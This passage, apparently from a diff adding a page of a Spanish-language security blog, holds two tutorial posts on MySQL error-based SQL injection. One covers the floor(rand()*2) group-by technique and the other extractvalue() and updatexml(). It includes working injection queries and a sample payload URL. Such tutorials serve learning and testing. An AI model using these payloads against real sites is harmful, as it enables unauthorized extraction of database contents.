floor(rand()*2);<br /><br />+-----------------+<br />| floor(rand()*2) |<br />+-----------------+<br />|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1 |<br />+-----------------+<br />1 row in set (0.00 sec)<br /></pre><pre class="brush: sql">mysql&gt; select floor(rand()*2);<br /><br />+-----------------+<br />| floor(rand()*2) |<br />+-----------------+<br />|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1 |<br />+-----------------+<br />1 row in set (0.00 sec)<br /></pre>la funcion rand() nos generara un valor aleatorio entre 0 y 0.xxxxxx  <br /><br /><pre class="brush: sql">mysql&gt; select rand();<br /><br />+--------------------+<br />| rand()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<br />+--------------------+<br />| 0.8679424085355759 |<br />+--------------------+<br />1 row in set (0.00 sec)</pre><br />Si multiplicamos por&nbsp; 2 esos valores generara un resultado diferente, esta vez entre 0 y 1.xxxx  <br /><br /><pre class="brush: sql">mysql&gt; select rand()*2;<br /><br />+-------------------+<br />| rand()*2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<br />+-------------------+<br />| 0.947171253102991 |<br />+-------------------+<br />1 row in set (0.00 sec)<br /><br /></pre><pre class="brush: sql">mysql&gt; select rand()*2;<br /><br />+--------------------+<br />| rand()*2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<br />+--------------------+<br />| 1.5282018757687899 |<br />+--------------------+<br />1 row in set (0.00 sec)<br /></pre>floor() toma un numero flotante y lo presenta como entero, es decir si le pasamos el siguiente numero generado por rand(). <br /><br /><pre class="brush: sql">mysql&gt; select floor(1.5282018757687899);<br /><br />+---------------------------+<br />| floor(1.5282018757687899) |<br />+---------------------------+<br />|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1 |<br />+---------------------------+<br />1 row in set (0.00 sec)<br /></pre>Da como resultado 1  <br /><br /><pre class="brush: sql">mysql&gt; select floor(0.947171253102991);<br /><br />+--------------------------+<br />| floor(0.947171253102991) |<br />+--------------------------+<br />|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0 |<br />+--------------------------+<br />1 row in set (0.00 sec)</pre><br /><br />Da como resultado 0  La magia del <span style="color: red;">floor(rand()*2)</span> no se basa en que de como resultado unicamente 1 o 0, se basa en que nos provea de dos resultados diferentes y que se repitan si es posible, daría lo mismo que diera 4 o 5.   <br /><br />Ahora extraeremos una parte del primer vector para realizar otro análisis <br /><br /><pre class="brush: sql">select count(*),<span style="color: red;">concat(user(),floor(rand()*2))x</span> from information_schema.tables group by x limit 0,1--<br /></pre><br />Esa x al final de la subconsulta, bien podría ser cualquier letra como p,c,f,c actua como puntero del resultado de esa sentencia y es usado por "group by" para agrupar la salida según el resultado: <br /><br /><pre class="brush: sql">mysql&gt; select concat(version(),floor(rand()*2))x;<br /><br />+-----------+<br />| x&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<br />+-----------+<br />| 5.5.28-11 |<br />+-----------+<br />1 row in set (0.00 sec)<br /></pre><pre class="brush: sql">mysql&gt; select concat(version(),floor(rand()*2))x;<br /><br />+-----------+<br />| x&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<br />+-----------+<br />| 5.5.28-10 |<br />+-----------+<br />1 row in set (0.00 sec)<br /></pre><br />Entonces seria los mismo realizarla asi. <br /><br /><pre class="brush: sql">mysql&gt; select count(*) from information_schema.tables group by concat(user(),floor(rand()*2));<br />ERROR 1062 (23000): Duplicate entry 'root@localhost0' for key 'group_key'</pre><br />Pero si intentamos tirar este vector por el parametro "id" seguiremos obteniendo el mensaje <br /><br /><pre class="brush: sql">"The used SELECT statements have a different number of columns"</pre><br />ya que requerimos de dos consultas por que el id hace referencia a ese numero como ya lo vimos en el codigo del script.  <br /><br />Bien hasta esta linea ya hemos entendido varios puntos claves en el funcionamiento del vector y vamos comprendiendo paso a paso el porque...  <br /><br />Segun las pruebas <span style="color: red;">floor(rand()*2)</span> genera dos valores aleatorios "0" o "1" group by aprovecha ese dato para realizar la agrupacion, el cual es fundamental ya que utilizaremos el error de entrada duplicada de la group_key para obtener la informacion. <br /><br />Sabemos hasta ahora que al repetirse los valores generados por floor(rand()*2) se produce el "duplicate entry" en la group_key, por lo tanto nos tirar el valor que se duplica. <br /><br />Si lo hicieramos sin user() obtendriamos. <br /><br /><pre class="brush: sql">mysql&gt; select count(*) from information_schema.tables group by floor(rand()*2);<br />ERROR 1062 (23000): Duplicate entry '1' for key 'group_key'</pre><br />Pero para obtener el nombre de usuario, la funcion user() se concatena con floor(rand()*2) para que sea disparado como valor duplicado, hay es donde toma protagonismo la subquery!.<br /><br />Ejecutemos ahora el vector completo.  <br /><br /><pre class="brush: sql">mysql&gt; select count(*),concat(user(),floor(rand()*2))z from information_schema.tables group by z;<br /><br />+----------+-----------------+<br />| count(*) | z&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<br />+----------+-----------------+<br />|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 123 | root@localhost0 | -&gt; floor(rand()*2)=0<br />|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 75 | root@localhost1 | -&gt; floor(rand()*2)=1<br />+----------+-----------------+<br />2 rows in set (0.00 sec)</pre><br />Vemos que cuando no tira el error, ordena en dos grupos la cantidad de registros en la tabla (tables) obtenidos por count(*), si la tabla tuviera un solo registro seria imposible reproducir la entrada duplicada, se podria usar cualquier otra tabla ademas de tables. <br /><br />Y una vez que el valor del orden del grupo se repite, BAM!  <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/LNyim2N.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/LNyim2N.png" height="270" width="640" /></a></div>Espero que se haya comprendido, esta fue la manera mediante la cual logre asimilarlo realmente, realizando análisis en el mismo servidor, cualquier consulta, duda o error comenten! <br /><br /><div style="text-align: right;">Saludos!</div></div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/13/sqli-error-based-extractvalue-updatexml/">SQLI Error Based Extractvalue() & Updatexml()</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-13T18:12:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>6:12 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><div style="text-align: right;"><div style="text-align: center;"><a href="http://www.glosariodigital.com/wp-content/themes/glosariodigital/thumb.php?src=http://www.glosariodigital.com/wp-content/uploads/2012/05/XML-.png&amp;w=666&amp;h=346" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://www.glosariodigital.com/wp-content/themes/glosariodigital/thumb.php?src=http://www.glosariodigital.com/wp-content/uploads/2012/05/XML-.png&amp;w=666&amp;h=346" height="331" width="640" /></a></div><b>by [Q]3rv[0]</b></div><br />Quien conozca de inyecciones sabe bien que para explotar una <span style="color: red;">Mysqli error based</span> es necesario utilizar las funciones floor() y rand() .<br /><br /><div style="text-align: center;"><a href="http://i.imgur.com/SjsNAze.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/SjsNAze.png" height="204" width="640" /></a></div>Pero hay otra manera que se basa en aprovechar otro tipo de error, incluso es mucho mas sencilla de interpretar, además de ser un vector corto y eficaz.<br /><br />Leyendo el blog de <span style="color: red;">Dmitry Evteev</span> en una entrada que había publicado en el 2009 (bastante viejita ya), encontré una forma de explotar un error based de una manera que llamo poderosamente mi atención.<br /><br />La función <span style="color: red;">extractvalue()</span> sirve para extraer valores de un elemento XML, por ejemplo tenemos la siguiente cadena:<b> &lt;b&gt;q3rv0&lt;/b&gt;</b><br /><br />Si quisiéramos extraer la palabra q3rv0 lo realizaríamos de la siguiente manera.<br /><br /><div style="text-align: center;"><a href="http://1.bp.blogspot.com/-AkjdFBaOWoM/VLXNoltONbI/AAAAAAAAAJk/-Uq2-akVX9Q/s1600/extract.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-AkjdFBaOWoM/VLXNoltONbI/AAAAAAAAAJk/-Uq2-akVX9Q/s1600/extract.png" height="107" width="400" /></a></div><br />La manera de aprovechar esta función para que nos devuelva información es obligarla a realizar un error de sintaxis.<br /><br />Que pasa si introducimos la funcion user() en el argumento que es utilizado para extraer ciertos valores.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-se05qFB5lrQ/VLXOEht67QI/AAAAAAAAAJs/-tWhSaeyCdM/s1600/error.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-se05qFB5lrQ/VLXOEht67QI/AAAAAAAAAJs/-tWhSaeyCdM/s1600/error.png" height="57" width="640" /></a></div><br />Como vemos nos arroja el error, además del usuarios en la db.<br /><br />El problema es que lo muestra entrecortado, para eso vamos a concatenar la salida.<br /><br /><div style="text-align: center;"><a href="http://2.bp.blogspot.com/-KnqMhRDtkg8/VLXORz_BucI/AAAAAAAAAJ0/-AWCM8QrOB8/s1600/error2.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-KnqMhRDtkg8/VLXORz_BucI/AAAAAAAAAJ0/-AWCM8QrOB8/s1600/error2.png" height="41" width="640" /></a></div><br />Como podemos llevarla acabo mediante una inyección?<br /><br />De la siguiente manera.<br /><br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ http://www.webvuln.com/negocio.php?id=60 union select extractvalue(1, concat(0x7e, version()))-- ]]></script><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/4eEgNDG.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/4eEgNDG.png" height="280" width="640" /></a></div><div style="text-align: center;"><h2><u><b>&nbsp;</b></u></h2><h2><u><b>Mysqli EB con updatexml()</b></u></h2></div><br />Para este tipo de metodo utilizaremos la funcion llamada updatexml().<br />Dicha función sirve para actualizar un elemento xml por otro.<br /><br />Tenemos el siguiente codigo.<br /><br /><script class="brush: xml" type="syntaxhighlighter"><![CDATA[ <b>jlkjslakjslka</b><h1>securitySignal</h1><i>kjaslkjalskjlaksj</i>]]></script> La sintaxis de updatexml() es la siguiente:<br /><br /><script class="brush: sql" type="syntaxhighlighter"><![CDATA[ updatexml('cadena', 'xpath_expr', 'cadena actualizada') ]]></script><br /><br />Entonces si quisieramos actualizar la porcion de codigo:<br /><br /><script class="brush: xml" type="syntaxhighlighter"><![CDATA[ <h1>securitySignal</h1>]]></script> <br />y cambiarlo por:<br /><br /><script class="brush: xml" type="syntaxhighlighter"><![CDATA[ <h1>securitySignal.tk</h1>]]></script><br />Lo hariamos de la siguiente manera.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-qy6-ad9jQWA/VLXPj0FMQUI/AAAAAAAAAKA/71GVHYAAt7k/s1600/secsignal.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-qy6-ad9jQWA/VLXPj0FMQUI/AAAAAAAAAKA/71GVHYAAt7k/s1600/secsignal.png" /></a></div><div style="text-align: center;"><br /></div>Entonces para generar un error en la función podemos reemplazar el xpath_expr por nuestra consulta deseada concatenada para evitar cortes en la respuesta.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-y0wH1ovhulY/VLXQGevLmFI/AAAAAAAAAKI/oLWvwbTCaI0/s1600/exec.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-y0wH1ovhulY/VLXQGevLmFI/AAAAAAAAAKI/oLWvwbTCaI0/s1600/exec.png" /></a></div><div style="text-align: center;"><br /></div>Referencia: <a href="http://devteev.blogspot.com.ar/2009/10/advanced-sql-injection-lab-full-pack.html">http://devteev.blogspot.com.ar/2009/10/advanced-sql-injection-lab-full-pack.html</a><br /><br /><br /><div style="text-align: right;">Saludos!</div><br /></div>
+  
+  
+
+
+    </article>
+  
+  <div class="pagination">
+    
+      <a class="prev" href="/posts/11">&larr; Older</a>
+    
+    <a href="/blog/archives">Blog Archives</a>
+    
+    <a class="next" href="/posts/9">Newer &rarr;</a>
+    
+  </div>
+</div>
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/03/08/format-string-atack/">Format String Atack</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/">Ringzer0 Level4 Pwned! By Hdbreaker</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/30/securitysocket-remote-exploit-library/">SecuritySocket Remote Exploit Library</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv/">Desbordando El Buffer en Linux X86 (IV)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/30/eko-party-pre-ctf/">EkoParty Pre CTF</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - q3rv0 - hdbreaker -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
